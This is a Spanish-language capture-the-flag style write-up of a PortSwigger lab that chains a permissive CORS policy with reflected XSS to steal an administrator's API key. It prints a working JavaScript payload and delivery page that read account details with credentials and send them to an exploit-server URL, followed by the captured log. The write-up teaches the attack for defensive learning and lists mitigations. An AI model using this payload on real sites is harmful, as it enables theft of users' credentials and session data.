# Write-up: CORS con XSS encadenado - PortSwigger Lab

## Descripción del Lab

Este laboratorio demuestra una vulnerabilidad de configuración CORS (Cross-Origin Resource Sharing) combinada con un XSS (Cross-Site Scripting) reflejado, que permite robar información sensible de usuarios autenticados.

**Objetivo:** Obtener el API key del usuario `administrator` mediante la explotación de CORS y XSS.

## Vulnerabilidades Identificadas

### 1. CORS mal configurado
El endpoint `/accountDetails` devuelve información sensible del usuario (incluyendo el API key) y está configurado para aceptar peticiones con credenciales desde cualquier subdominio del lab:

```http
GET /accountDetails HTTP/2
Host: 0ad900c9031651e180a9c14d004400f0.web-security-academy.net

HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net
```

**Problema:** La configuración permite subdominios tanto HTTP como HTTPS, lo cual es peligroso si algún subdominio es vulnerable.

### 2. XSS Reflejado en el subdominio `stock`
El parámetro `productId` en la funcionalidad "Check stock" es vulnerable a XSS:

```
http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=<script>alert(1)</script>
```

## Explotación

### Paso 1: Verificar la configuración CORS

Usando Burp Repeater, enviamos una petición a `/accountDetails` con un header `Origin` apuntando a un subdominio:

```http
GET /accountDetails HTTP/2
Host: 0ad900c9031651e180a9c14d004400f0.web-security-academy.net
Origin: http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net
Cookie: session=...
<REDACTED>
```

**Respuesta:**
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net

{
  "username": "wiener",
  "email": "...",
  "apikey": "...",
  "sessions": [...]
}
```

Confirmado: el servidor refleja el `Origin` y permite credenciales desde subdominios.

### Paso 2: Identificar el XSS

Visitamos la funcionalidad "Check stock" en cualquier producto y observamos que hace una petición a:

```
http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=1&storeId=1
```

Probamos inyectar código JavaScript en `productId`:

```
http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=<script>alert(1)</script>
```

El código se ejecuta, confirmando la vulnerabilidad XSS.

### Paso 3: Crear el exploit encadenado

El ataque funciona en dos partes:

#### A) Payload XSS (se ejecuta en el subdominio `stock`)

Este código JavaScript roba el API key haciendo una petición con credenciales desde un origen permitido por CORS:

```javascript
var xhr = new XMLHttpRequest();
xhr.onload = function() {
    location = 'https://exploit-SERVER_ID.exploit-server.net/log?data=' + encodeURIComponent(this.responseText);
};
xhr.open('GET', 'https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
```

#### B) Página en el Exploit Server

Esta página redirige a la víctima al subdominio vulnerable con el payload XSS inyectado:

```html
<script>
location = 'http://stock.0ad900c9031651e180a9c14d004400f0.web-security-academy.net/?productId=<script>var xhr=new XMLHttpRequest();xhr.onload=function(){location="https://exploit-SERVER_ID.exploit-server.net/log?data="%2BencodeURIComponent(this.responseText);};xhr.open("GET","https://0ad900c9031651e180a9c14d004400f0.web-security-academy.net/accountDetails",true);xhr.withCredentials=true;xhr.send();<\/script>&storeId=1';
</script>
```

**Nota importante:** El `<\/script>` está escapado para evitar que cierre prematuramente el script contenedor.

### Paso 4: Desplegar el exploit

1. **Copiar el código HTML** al cuerpo del exploit server
2. **Click en "Store"** para guardar el exploit
3. **Click en "View exploit"** para probarlo con tu propia sesión (deberías ver tu API key en la URL)
4. **Click en "Deliver exploit to victim"** para enviarlo al administrador

### Paso 5: Recuperar el API key

Ir a **"Access log"** en el exploit server y buscar la entrada que contenga `/log?data=`:

```
10.0.3.81 2026-02-12 21:19:25 +0000 
"GET /log?data=%7B%0A%20%20%22username%22%3A%20%22administrator%22%2C%0A%20%20%22email%22%3A%20%22%22%2C%0A%20%20%22apikey%22%3A%20%22h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC%22%2C%0A%20%20%22sessions%22%3A%20%5B%0A%20%20%20%20%2245SgnHiFRDyJAHh7at2dHYkWmzkkzKut%22%0A%20%20%5D%0A%7D HTTP/1.1" 200
```

Decodificando el parámetro `data`:

```json
{
  "username": "administrator",
  "email": "",
  "apikey": "h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC",
  "sessions": [
    "45SgnHiFRDyJAHh7at2dHYkWmzkkzKut"
  ]
}
```

**API Key robado:** `h4rDwz8cxZcVcVY4qc9laZR8yOvwuvOC`

### Paso 6: Completar el lab

Enviar el API key en la solución del laboratorio.

## Flujo del Ataque

```
1. Víctima accede al exploit server
   ↓
2. JavaScript redirige a: http://stock.LAB_ID/?productId=<XSS_PAYLOAD>
   ↓
3. XSS se ejecuta en el contexto del subdominio stock
   ↓
4. Desde stock (origen permitido por CORS):
   - XMLHttpRequest a /accountDetails con withCredentials=true
   - Browser adjunta cookies de sesión automáticamente
   ↓
5. Servidor responde con:
   - Access-Control-Allow-Origin: http://stock...
   - Access-Control-Allow-Credentials: true
   - JSON con datos sensibles
   ↓
6. JavaScript lee la respuesta (CORS lo permite)
   ↓
7. Exfiltra datos al exploit server: /log?data=ENCODED_JSON
   ↓
8. Atacante lee el Access log y obtiene el API key
```

## Lecciones Aprendidas

### Errores de seguridad explotados:

1. **CORS demasiado permisivo:**
   - Permitir **todos los subdominios** es peligroso
   - Mezclar HTTP y HTTPS en subdominios amplía la superficie de ataque
   - `Access-Control-Allow-Credentials: true` debe usarse solo con orígenes específicos y de confianza

2. **XSS no sanitizado:**
   - El parámetro `productId` no valida/escapa la entrada del usuario
   - Un solo XSS en un subdominio compromete toda la política CORS

3. **Falta de validación del origen:**
   - El servidor refleja el `Origin` sin validación estricta
   - Debería usar una lista blanca explícita de orígenes confiables

### Mitigaciones recomendadas:

- **Nunca usar wildcards o regex demasiado amplios** en CORS
- **Validar y escapar toda entrada del usuario** para prevenir XSS
- **Usar HTTPS exclusivamente** en todos los subdominios
- **Implementar CSP (Content Security Policy)** para mitigar XSS
- **Auditar regularmente** la configuración de CORS en endpoints sensibles
- **Considerar alternativas a CORS** como tokens de API en headers custom

## Referencias

- [PortSwigger Web Security Academy - CORS](https://portswigger.net/web-security/cors)
- [OWASP - CORS Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CORS_Security_Cheat_Sheet.html)
- [MDN - Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
